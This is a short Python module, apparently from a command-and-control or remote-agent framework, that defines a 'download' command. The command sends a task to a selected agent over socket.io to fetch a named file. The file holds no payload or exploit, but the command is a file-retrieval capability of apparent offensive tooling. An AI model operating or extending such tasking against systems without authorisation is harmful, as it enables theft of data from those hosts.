import json

from .commands import FileSystemCommand
from connect.convert import string_to_base64
from connect.output import display


class Download(FileSystemCommand):
    def __init__(self):
        super().__init__(
            'download',
            'Download a file',
            parameters={
                'source': 'What file should we download'
            }
        )

    def execute_command(self, parameters, current_agent, client_sio):
        if len(parameters) != 1:
            self.help()
            return
        download_task = {
            'create': {
                'agent': current_agent,
                'method': self.name,
                'type': 2,
                'module': self.module,
                'parameters': [
                    parameters[0],
                ]
            }
        }
        client_sio.emit('task', download_task)
